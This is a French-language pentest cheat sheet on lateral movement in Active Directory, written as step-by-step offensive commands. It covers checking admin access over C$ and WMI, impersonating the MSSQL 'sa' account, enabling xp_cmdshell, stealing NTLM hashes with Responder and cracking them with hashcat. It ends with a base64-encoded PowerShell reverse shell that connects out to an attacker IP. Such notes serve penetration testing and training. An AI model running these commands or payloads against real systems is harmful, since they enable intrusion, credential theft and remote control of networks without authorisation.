---
title: Lateral Movement
description: Ce document regroupe des commandes et techniques pour faire du mouvement Lateral dans un environnement deja qu'on a un acces
layout: post
toc: true
---



Le mouvement latéral consiste en des techniques que les adversaires utilisent pour entrer et contrôler des systèmes distants sur un réseau. Pour atteindre leur objectif principal, il faut souvent explorer le réseau pour trouver leur cible et y accéder par la suite. Atteindre leur objectif implique souvent de passer par plusieurs systèmes et comptes pour gagner. Les adversaires peuvent installer leurs propres outils d'accès à distance pour effectuer un mouvement latéral ou utiliser des informations d'identification légitimes avec des outils de réseau et de système d'exploitation natifs, qui peuvent être plus furtifs.

En un mot, ce que nous essayons de réaliser dans la phase de mouvement latéral est d'accéder à d'autres systèmes dans l'environnement cible.

Cette phase est précédée de la phase `Privilege Escalation`, c'est très important puisque nous allons baser toutes les techniques sur les hypothèses suivantes :

- Nous avons déjà obtenu l'accès à l'environnement interne
- Nous sommes en possession du matériel d'identification pour un ou plusieurs utilisateurs
- Nous avons (éventuellement) obtenu un accès privilégié à une ou plusieurs machines par des moyens quelconques.

Les techniques et le type d'accès que nous allons obtenir dépendront du niveau de privilèges de l'utilisateur compromis.
Le but de ce chapitre est de créer une collection complète de techniques qui répondront aux questions suivantes :
- À quoi d'autre ai-je accès ?
- Comment y accéder ?


## Trouver ou nous avons un acces
Le moyen le plus simple de déterminer si nous avons un accès `administrateur` local (et donc si nous faisons partie du groupe `Administrateurs` local) à une machine distante est d'essayer de répertorier le contenu du lecteur `C` : à l'aide de la commande suivante :

```sh
$ dir \\<TARGET>\C$
$ dir \\DC01.target.local\C$
```
Le succès de cette opération indiquera si nous avons un accès administratif ou non.
Un autre moyen rapide de déterminer l'accès `administrateur` à distance consiste à utiliser `WMI` à l'aide de l'applet de commande suivante :

```sh
$ powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername TARGET
$ powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername globex.dojo
```


## MSSQL for Lateral Movement
Dans un environnement **Active Directory**, une fois un accès initial obtenu (ex. : via un compte utilisateur compromis), l'exploitation de Microsoft SQL Server (MSSQL) peut permettre d'escalader les privilèges et de réaliser un mouvement latéral vers d'autres systèmes. Voici les étapes clés dans un scénario générique :

Utilise des credentials valides pour te connecter à une instance `MSSQL` avec l'authentification Windows.
```sh
$ mssqlclient.py utilisateur:motdepasse@SERVEUR_SQL -target-ip <IP_SERVEUR> -windows-auth
```
Évalue les permissions actuelles du compte connecté pour déterminer les capacités.

```sh
$ SQL (DOMAINE\utilisateur guest@master)> SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
$ SQL (DOMAINE\utilisateur guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
$ SQL (DOMAINE\utilisateur guest@master)> EXEC xp_cmdshell 'whoami';
```
**Résultat** : Privilèges limités (ex. : `guest`), absence de droits `sysadmin`, accès refusé à `xp_cmdshell` si non activé.

**Usurpation d'identité (Impersonation)**
Vérifie si tu peux usurper l'identité d'un compte `administrateur` SQL (ex. : `sa`) et passe à ce compte.

```sh
$ SQL (DOMAINE\utilisateur guest@master)> enum_impersonate
$ SQL (DOMAINE\utilisateur guest@master)> EXECUTE AS LOGIN = 'sa'
$ SQL (sa dbo@master)> SELECT SYSTEM_USER;
$ SQL (sa dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

```
Résultat : Succès de l'impersonation, confirmation des droits `sysadmin` avec le compte `sa`.

**Activation et utilisation de xp_cmdshell**
Active la procédure stockée `xp_cmdshell` pour exécuter des commandes système et récupérer des informations.

```sh
$ SQL (sa dbo@master)> EXEC sp_configure 'show advanced options', 1;
$ SQL (sa dbo@master)> RECONFIGURE;
$ SQL (sa dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
$ SQL (sa dbo@master)> RECONFIGURE;
$ SQL (sa dbo@master)> EXEC xp_cmdshell 'whoami';
```

**Vol de hash NTLM avec Responder**
Utilise `xp_cmdshell` pour provoquer une connexion `SMB` et vole un hash `NTLM` avec `Responder`.

```sh
$ SQL (sa dbo@master)> EXEC xp_cmdshell '\\<IP_REDIRECT>\partage';
# Sur une autre machine avec Responder :
$ responder -I <INTERFACE_RESEAU>
# Une fois le hash capturé, casse-le :
$ hashcat -a 0 hash_capturé.txt /usr/share/wordlists/rockyou.txt
```


**Reverse Shell avec xp_cmdshell**

```sh
$ SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```